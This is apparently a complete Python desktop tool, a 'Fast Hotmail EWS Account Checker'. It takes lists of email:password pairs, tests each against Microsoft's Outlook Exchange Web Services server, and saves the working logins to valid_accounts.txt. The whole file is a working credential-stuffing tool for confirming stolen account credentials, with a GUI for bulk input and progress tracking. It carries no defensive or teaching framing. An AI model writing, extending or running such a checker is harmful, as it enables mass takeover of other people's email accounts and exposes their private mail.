import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import webbrowser
from exchangelib import Credentials, Account, DELEGATE, Configuration
import threading

# Global counts
success_count = 0
failed_count = 0
total_accounts = 0

# Function to check login
def check_hotmail_login(email, password):
    try:
        creds = Credentials(email, password)
        config = Configuration(credentials=creds, server='outlook.office365.com')
        account = Account(email, config=config, autodiscover=False, access_type=DELEGATE)
        account.inbox.all().count()  # Test inbox access
        return True
    except Exception:
        return False

# Process accounts in a thread
def process_accounts(accounts):
    global success_count, failed_count, total_accounts
    success_count = 0
    failed_count = 0
    total_accounts = len(accounts)
    
    valid_accounts = []
    failed_accounts = []

    progress_bar["maximum"] = total_accounts  # Set progress bar limit
    progress_bar["value"] = 0  # Reset progress

    for index, line in enumerate(accounts, start=1):
        parts = line.strip().split(":")
        if len(parts) != 2:
            update_progress(f"⚠️ Skipping invalid line: {line}")
            continue

        email, password = parts
        update_progress(f"🔄 Checking {index}/{total_accounts}: {email}...")

        success = check_hotmail_login(email, password)

        if success:
            valid_accounts.append(f"{email}:{password}")
            success_count += 1
            update_progress(f"✅ {email} (Success)")
        else:
            failed_accounts.append(f"❌ {email} (Failed)")
            failed_count += 1

        update_summary()
        update_progress_bar(index)

    # Save results
    with open("valid_accounts.txt", "w") as f:
        f.write("\n".join(valid_accounts))
    with open("failed_accounts.txt", "w") as f:
        f.write("\n".join(failed_accounts))

    update_progress(f"✅ Process Complete! {success_count} successful, {failed_count} failed.")
    messagebox.showinfo("Done", "Account checking finished!")

# Start processing accounts in a separate thread
def start_processing(accounts):
    if not accounts:
        messagebox.showwarning("No Accounts", "No accounts to check!")
        return

    progress_text.delete("1.0", tk.END)
    summary_label.config(text="✅ 0 Success | ❌ 0 Failed")
    threading.Thread(target=process_accounts, args=(accounts,), daemon=True).start()

# File upload function
def upload_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if not file_path:
        messagebox.showwarning("No File Selected", "Please select a file to proceed.")
        return
    with open(file_path, "r") as f:
        accounts = f.readlines()
    start_processing(accounts)

# Paste accounts function
def paste_accounts():
    input_text = input_box.get("1.0", tk.END).strip()
    if not input_text:
        messagebox.showwarning("No Input", "Please enter email:password list.")
        return
    accounts = input_text.split("\n")
    start_processing(accounts)

# GUI progress update
def update_progress(message):
    progress_text.insert(tk.END, message + "\n")
    progress_text.see(tk.END)

# GUI success/failure count update
def update_summary():
    summary_label.config(text=f"✅ {success_count} Success | ❌ {failed_count} Failed")

# Update progress bar
def update_progress_bar(current_index):
    progress_bar["value"] = current_index
    progress_percentage.set(f"{int((current_index / total_accounts) * 100)}% Completed")
    root.update_idletasks()

# Open valid accounts file
def open_valid_accounts():
    try:
        webbrowser.open("valid_accounts.txt")
    except Exception as e:
        messagebox.showerror("Error", f"Could not open file: {e}")

# Create GUI
def create_gui():
    global root, progress_text, input_box, summary_label, progress_bar, progress_percentage
    root = tk.Tk()
    root.title("⚡ Fast Hotmail EWS Account Checker")
    root.geometry("600x550")

    label = tk.Label(root, text="Upload or Paste Accounts (email:password)", font=("Arial", 12))
    label.pack(pady=5)

    frame = tk.Frame(root)
    frame.pack()

    upload_button = tk.Button(frame, text="📂 Upload File", command=upload_file, font=("Arial", 10), bg="lightblue")
    upload_button.pack(side=tk.LEFT, padx=10)

    paste_button = tk.Button(frame, text="✂️ Paste Accounts", command=paste_accounts, font=("Arial", 10), bg="lightgreen")
    paste_button.pack(side=tk.LEFT, padx=10)

    input_box = scrolledtext.ScrolledText(root, height=5, width=60)
    input_box.pack(pady=5)

    summary_label = tk.Label(root, text="✅ 0 Success | ❌ 0 Failed", font=("Arial", 12))
    summary_label.pack(pady=5)

    # Progress Bar
    progress_percentage = tk.StringVar()
    progress_percentage.set("0% Completed")
    progress_label = tk.Label(root, textvariable=progress_percentage, font=("Arial", 10))
    progress_label.pack()

    progress_bar = ttk.Progressbar(root, length=500, mode='determinate')
    progress_bar.pack(pady=5)

    progress_text = scrolledtext.ScrolledText(root, height=10, width=70)
    progress_text.pack(pady=5)

    open_valid_button = tk.Button(root, text="📜 View Successful Logins", command=open_valid_accounts, font=("Arial", 10), bg="lightyellow")
    open_valid_button.pack(pady=5)

    root.mainloop()

# Start GUI
create_gui()
